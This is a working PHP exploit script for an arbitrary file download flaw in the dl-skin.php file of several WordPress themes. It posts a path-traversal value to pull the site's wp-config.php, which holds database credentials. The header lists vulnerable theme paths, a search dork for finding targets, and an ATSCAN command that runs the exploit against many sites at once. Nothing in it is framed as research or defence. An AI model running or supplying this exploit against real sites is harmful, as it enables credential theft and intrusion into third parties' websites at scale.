<?php
/*
 ====================================================================
 WORDPRESS AFD dl-skin.php Exploit
 ====================================================================
   CODED BY: Ali Mehdioui.
   GROUP: Alisam Technology.
   Thanks to xbadgirl21.
   Requiered libs:
   apt-get install php5-curl
   [+][+]
   DORK: index of /lib/scripts/dl-skin.php
   [+][+]
   VULNERABLE THEMES:
     wp-content/themes/awake/lib/scripts 
     wp-content/themes/elegance/lib/scripts/ 
     wp-content/themes/barracudafx/lib/scripts/
     wp-content/themes/fusion/lib/scripts/
     wp-content/themes/dejavu/lib/scripts/
     wp-content/themes/infocus/lib/scripts/ 
     wp-content/themes/Minamaze_Pro/lib/scripts/
     wp-content/themes/Melos_Pro/lib/scripts/ 
     wp-content/themes/versatile/lib/scripts/ 
     wp-content/themes/construct/lib/scripts/
     wp-content/themes/persuasion/lib/scripts/ 
     wp-content/themes/mesocolumn/lib/scripts/ 
   [+][+]  
   USAGE: 
   php dl-skin-exploit.php http://site.com/wp-content/themes/THEME NAME/lib/scripts/dl-skin.php
   [+][+]
   ATSCAN MASS USAGE:
   atscan -d "index of /lib/scripts/dl-skin.php" -l 20 -m 2 --replace "scripts" --with "scripts/dl-skin.php" --full --ifinurl "lib/scripts --command "php WP-dl-skin.php-exploit.php --TARGET"  
 ====================================================================
*/
  print "
      [+]================================================================[+]
      [+]-------------  Wordpress AFD dl-skin.php Exploit  --------------[+]
      [+]--------------          Alisam Technology         --------------[+]
      [+]------ https://www.fb.com/Forces.des.tempetes.marocaines  ------[+]
      [+]------        https://www.youtube.com/user/aliartes       ------[+]
      [+]================================================================[+]
	  
  ";
  if (!isset($argv[1])) {echo "Usage: php WP-dl-skin.php-exploit.php http://site.com/wp-content/themes/THEME NAME/lib/scripts/dl-skin.php\n"; exit;}
  $ur = isset($argv[1]) && strstr($argv[1], 'http') ? $argv[1] : "http://{$argv[1]}";
  $argv[1] = $ur;
  $data_to_post = array();
  $data_to_post['_mysite_download_skin'] = '../../../../../wp-config.php';

  $curl = curl_init();
  curl_setopt($curl,CURLOPT_URL, $ur);
  curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
  curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
  $result = curl_exec($curl);
  echo $result;
  curl_close($curl);
  
/*
 ====================================================================
  End
 ====================================================================
*/
?>
